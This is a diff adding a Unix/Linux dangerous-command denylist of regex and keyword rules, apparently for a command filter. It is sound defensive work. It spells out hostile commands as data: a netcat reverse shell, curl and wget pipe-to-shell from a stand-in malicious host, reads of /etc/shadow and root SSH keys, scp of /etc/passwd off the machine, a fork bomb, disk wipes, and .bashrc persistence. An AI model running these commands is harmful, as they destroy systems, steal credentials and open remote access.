@@ -1,0 +1,57 @@
+# Unix/Linux Dangerous Command Denylist
+# Lines starting with # are comments
+
+# Dangerous file deletion
+REGEX: (?i)\brm\s+-rf\s+(/\s*|\*|--no-preserve-root)
+REGEX: (?i)\brm\s+-rf\s+.*(/etc|/bin|/usr|/var|/home|/root|/opt|/lib|/sbin|/dev|/proc|/sys)
+KEYWORD: rm -rf /
+KEYWORD: rm -rf --no-preserve-root
+
+# System shutdown/reboot
+REGEX: (?i)\b(shutdown|reboot|halt|poweroff)\b
+KEYWORD: shutdown -h now
+KEYWORD: reboot
+KEYWORD: halt
+KEYWORD: poweroff
+
+# User and permission changes
+REGEX: (?i)\b(useradd|userdel|usermod|passwd|sudo|chown|chmod)\b
+KEYWORD: sudo su
+KEYWORD: sudo -i
+KEYWORD: passwd
+KEYWORD: chmod 777 /
+KEYWORD: chown root:root /etc/passwd
+
+# Network and remote access
+REGEX: (?i)\b(nc|netcat|curl|wget|scp|ftp)\b.*\|.*(sh|bash)
+KEYWORD: nc -lvp 4444 -e /bin/bash
+KEYWORD: curl http://malicious.site | sh
+KEYWORD: wget http://malicious.site -O- | sh
+KEYWORD: scp /etc/passwd user@remote:/tmp/
+
+# Process and system control
+REGEX: (?i)\b(kill|pkill|killall)\b\s+(-9\s+)?(1|init|systemd)
+KEYWORD: kill -9 1
+KEYWORD: pkill -f .*
+KEYWORD: killall -u root
+
+# Data exfiltration
+REGEX: (?i)\b(cat|less|more|head|tail)\b\s+(/etc/shadow|/root/.ssh/id_rsa|/etc/passwd)
+KEYWORD: cat /etc/shadow
+KEYWORD: cat /root/.ssh/id_rsa
+
+# Privilege escalation
+KEYWORD: sudo su
+KEYWORD: sudo -i
+
+# Dangerous scripting (fork bomb)
+KEYWORD: :(){ :|:& };:
+
+# Disk formatting
+REGEX: (?i)\b(mkfs|dd|fdisk|parted)\b
+KEYWORD: mkfs.ext4 /dev/sda
+KEYWORD: dd if=/dev/zero of=/dev/sda
+
+# System configuration
+REGEX: (?i)\becho\s+.*>>\s+.*(bashrc|profile|startup|rc.local)\b
+KEYWORD: echo "malicious_code" >> ~/.bashrc
